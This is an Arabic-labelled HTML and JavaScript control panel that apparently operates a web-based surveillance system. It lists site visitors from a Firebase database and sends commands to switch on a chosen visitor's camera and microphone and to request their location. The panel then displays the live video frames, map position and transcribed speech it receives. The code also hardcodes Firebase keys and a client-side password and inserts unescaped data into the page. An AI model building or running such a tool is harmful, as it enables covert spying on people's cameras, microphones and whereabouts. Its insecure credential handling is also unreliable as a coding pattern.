<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لوحة الإدارة - مراقبة مباشرة</title>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>

  <style>
    body { font-family: 'Cairo', sans-serif; background:#f1f5f9; margin:0; padding:20px; }
    .panel { background:white; padding:20px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.1); margin-bottom:20px; }
    table { width:100%; border-collapse:collapse; }
    th, td { padding:12px; text-align:right; border-bottom:1px solid #ddd; cursor:pointer; }
    th { background:#1e40af; color:white; }
    #live-img { max-width:700px; border:3px solid #ef4444; border-radius:12px; }
  </style>
</head>
<body>

<div class="panel">
  <h1>🔴 مراقبة الزوار مباشرة</h1>
  <table id="visitorsTable">
    <thead><tr><th>معرف الزائر</th><th>الجهاز</th><th>الموقع</th><th>الحالة</th></tr></thead>
    <tbody></tbody>
  </table>
</div>

<div class="panel" id="controlPanel" style="display:none;">
  <h2>مراقبة: <span id="selectedId"></span></h2>
  
  <button onclick="sendCommand('startCamera')" style="background:#ef4444;color:white;padding:12px 20px;">📹 بدء البث المباشر</button>
  <button onclick="sendCommand('requestLocation')" style="background:#3b82f6;color:white;padding:12px 20px;">📍 طلب الموقع</button>
  <button onclick="sendCommand('startMic')" style="background:#10b981;color:white;padding:12px 20px;">🎤 تفعيل الصوت</button>

  <h3>البث المباشر (الكاميرا)</h3>
  <img id="live-img" src="" alt="البث المباشر">

  <h3>الموقع</h3>
  <div id="map"></div>

  <h3>الصوت المسموع</h3>
  <div id="voice" style="background:#f0fdf4;padding:15px;border-radius:8px;min-height:70px;"></div>
</div>

<script>
  const firebaseConfig = { /* نفس الإعدادات أعلاه */ 
    apiKey: "AIzaSyBQ9MlVOSzohuTqSA2JdI19UjyldnAb-zI",
    authDomain: "ohaha-d130e.firebaseapp.com",
    projectId: "ohaha-d130e",
    storageBucket: "ohaha-d130e.firebasestorage.app",
    messagingSenderId: "309282072723",
    appId: "1:309282072723:web:ed17bfe365577fba2ec566"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  let selectedVisitor = null;

  function login() {
    const pass = prompt("أدخل كلمة المرور:");
    if (pass === "521988") loadVisitors();
    else alert("كلمة مرور خاطئة");
  }

  function loadVisitors() {
    db.ref('visitors').on('value', snap => {
      let html = '';
      snap.forEach(child => {
        const d = child.val();
        html += `<tr onclick="selectVisitor('${child.key}')">
          <td>${child.key}</td>
          <td>${d.device || '-'}</td>
          <td>${d.location ? '✅' : '❌'}</td>
          <td>متصل</td>
        </tr>`;
      });
      document.querySelector('#visitorsTable tbody').innerHTML = html || '<tr><td colspan="4">لا يوجد زوار حالياً</td></tr>';
    });
  }

  function selectVisitor(id) {
    selectedVisitor = id;
    document.getElementById('selectedId').textContent = id;
    document.getElementById('controlPanel').style.display = 'block';
    watchLiveFeed(id);
    watchLocation(id);
    watchVoice(id);
  }

  function sendCommand(type) {
    if (!selectedVisitor) return;
    db.ref('commands/' + selectedVisitor).set({ type: type, time: Date.now() });
  }

  function watchLiveFeed(id) {
    db.ref('live/' + id + '/frame').on('value', snap => {
      const frame = snap.val();
      if (frame && frame.data) {
        document.getElementById('live-img').src = frame.data;
      }
    });
  }

  function watchLocation(id) {
    db.ref('visitors/' + id + '/location').on('value', snap => {
      const loc = snap.val();
      if (loc) {
        document.getElementById('map').innerHTML = `<iframe width="100%" height="400" src="https://www.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed" frameborder="0"></iframe>`;
      }
    });
  }

  function watchVoice(id) {
    db.ref('visitors/' + id + '/voice').on('value', snap => {
      const v = snap.val();
      if (v) document.getElementById('voice').innerHTML = `<strong>${new Date(v.time).toLocaleTimeString()}</strong><br>${v.text}`;
    });
  }

  window.onload = login;
</script>
</body>
</html>
